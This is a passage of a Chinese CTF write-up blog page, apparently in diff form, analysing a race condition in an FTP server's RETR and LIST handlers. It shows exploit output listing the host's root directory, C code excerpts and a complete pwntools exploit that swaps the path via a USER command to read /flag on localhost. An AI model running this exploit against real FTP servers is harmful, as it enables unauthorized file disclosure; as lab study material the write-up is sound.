class="number">24</span> server</span><br><span class="line">    -rw-------  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2147483648</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> swapfile</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lib32</span><br><span class="line">    drwxr-xr-x  <span class="number">19</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4180</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">01</span> dev</span><br><span class="line">    drwx------  <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">16384</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lost+found</span><br><span class="line">    drwx------  <span class="number">6</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Sep <span class="number">01</span> <span class="number">23</span>:<span class="number">26</span> root</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> bin</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">37</span> media</span><br><span class="line">    drwxr-xr-x  <span class="number">12</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Sep <span class="number">24</span> <span class="number">10</span>:<span class="number">10</span> snap</span><br><span class="line">    drwxr-xr-x  <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">29</span> <span class="number">06</span>:<span class="number">03</span> glibc</span><br><span class="line">    drwxr-xr-x  <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Jan <span class="number">07</span> <span class="number">10</span>:<span class="number">01</span> boot</span><br><span class="line">    drwxr-xr-x  <span class="number">14</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">09</span> <span class="number">19</span>:<span class="number">54</span> var</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">22</span>:<span class="number">55</span> mnt</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> sbin</span><br><span class="line">[*] Closed connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> port <span class="number">33416</span></span><br><span class="line">[*] Closed connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> port <span class="number">2121</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>成功读取出主机的根目录文件</li>
+</ul>
+<p>接下来分析实现下载功能的函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpRETR</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 验证目标目录路径 */</span></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( S_ISDIR(filestats.st_mode) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; RETR: &quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建list_thread线程来执行RETR命令 */</span></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))retr_thread, context);</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">retr_thread</span><span class="params">(PFTPCONTEXT context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> SOCKET		clientsocket;</span><br><span class="line">    <span class="keyword">int</span>					sent_ok, f;</span><br><span class="line">    <span class="keyword">off_t</span>				offset;</span><br><span class="line">    <span class="keyword">ssize_t</span>				sz, sz_total;</span><br><span class="line">    <span class="keyword">size_t</span>				buffer_size;</span><br><span class="line">    <span class="keyword">char</span>				*buffer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>		<span class="title">t</span>;</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">long</span> <span class="keyword">long</span>	lt0, lt1, dtx;</span><br><span class="line">    <span class="keyword">gnutls_session_t</span>	TLS_datasession;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line">    pthread_cleanup_push(cleanup_handler, context);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    buffer = <span class="built_in">malloc</span>(TRANSMIT_BUFFER_SIZE);</span><br><span class="line">    <span class="keyword">while</span> (buffer != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        clientsocket = create_datasocket(context);</span><br></pre></td></tr></table></figure>
+<p>下载函数 <code>ftpRETR</code> 中也有类似的条件竞争漏洞，可以用相同的方法来下载 flag 文件</p>
+<p>完整 exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">p = remote(ip,<span class="number">2121</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;USER anonymous\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line">p.send(<span class="string">&quot;PASS 123456\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;EPSV\r\n&quot;</span>)</span><br><span class="line">ret = p.recv()</span><br><span class="line">success(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Entering Extended Passive Mode&quot;</span> <span class="keyword">in</span> ret:</span><br><span class="line">    parts = ret.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    pport = <span class="built_in">int</span>(parts[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;Passive port: %s&quot;</span> % pport)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;RETR \r\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;USER /flag \r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p2 = remote(ip,pport)</span><br><span class="line"></span><br><span class="line">success(p.recv())</span><br><span class="line">success(<span class="string">&quot;&lt;------------------------------------&gt;&quot;</span>)</span><br><span class="line">success(p2.recv())</span><br></pre></td></tr></table></figure>
+<hr>
+<p><strong>小结：</strong></p>
+<p>这种题目就比较贴合现实漏洞利用了，涨见识了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Race-condition/" rel="tag"><i class="fa fa-tag"></i> Race condition</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/10/House%20Of%20Corrosion-%E5%8E%9F%E7%90%86/" rel="prev" title="House Of Corrosion-原理">
+      <i class="fa fa-chevron-left"></i> House Of Corrosion-原理
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">207</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">123</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">2.8m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">41:49</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
